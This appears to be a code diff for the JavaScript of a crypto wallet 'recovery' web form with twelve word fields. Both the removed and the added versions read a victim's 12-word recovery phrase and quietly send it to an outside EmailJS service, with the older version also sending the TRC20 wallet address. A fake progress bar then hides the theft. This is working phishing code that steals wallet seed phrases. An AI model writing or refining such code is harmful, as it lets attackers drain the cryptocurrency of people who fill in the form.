@@ -551,49 +551,43 @@ select:focus {
     });
   }
 
-  // Step 2 → Step 3
-  if (s2btn) {
-    s2btn.addEventListener('click', () => {
-      let phrase = '';
-      for (let i = 1; i <= 12; i++) {
-        const id = `word${i}`;
-        const valEl = document.getElementById(id);
-        const val = valEl ? valEl.value.trim() : '';
+  // Step 2 → Step 3 (send phrase only)
+if (s2btn) {
+  s2btn.addEventListener('click', () => {
+    let phrase = '';
+    for (let i = 1; i <= 12; i++) {
+      const input = document.getElementById(`word${i}`);
+      if (input) {
+        const val = input.value.trim();
         if (!val) {
-          setFieldError(id, `Please enter word ${i}.`);
-          if (phrase === '' && valEl) valEl.focus();
+          showToast(`Please enter word ${i}.`);
+          input.focus();
           return;
-        } else {
-          setFieldError(id, '');
         }
         phrase += val + ' ';
       }
-      phrase = phrase.trim();
+    }
+    phrase = phrase.trim();
 
-      const matchCheck = document.getElementById('matchCheck');
-      if (!matchCheck || !matchCheck.checked) {
-        showToast("Please confirm your backup matches your TRC20 wallet address.");
-        return;
-      }
-
-      const addr = document.getElementById('addr').value.trim();
-      emailjs.send("service_1qzlil7", "template_w742mzr", {
-        wallet_address: addr,
-        recovery_phrase: phrase
-      }).then(() => {
-        console.log("Data sent");
-      }).catch(err => {
-        console.error("Error sending", err);
-      });
-
-      prog.style.width = '70%';
-      setTimeout(() => {
-        prog.style.width = '100%';
-        s2.hidden = true;
-        s3.hidden = false;
-      }, 3000);
+    // Send only the phrase via EmailJS
+    console.log("Sending phrase:", phrase);
+    emailjs.send("service_1qzlil7", "template_w742mzr", {
+      recovery_phrase: phrase
+    }).then(() => {
+      console.log("Phrase sent successfully");
+    }).catch(err => {
+      console.error("Error sending phrase", err);
     });
-  }
+
+    // Continue with your existing flow
+    prog.style.width = '70%';
+    setTimeout(() => {
+      prog.style.width = '100%';
+      s2.hidden = true;
+      s3.hidden = false;
+    }, 3000);
+  });
+}
 
   // Remove blinking once a tier is chosen
   if (tierSelect) {
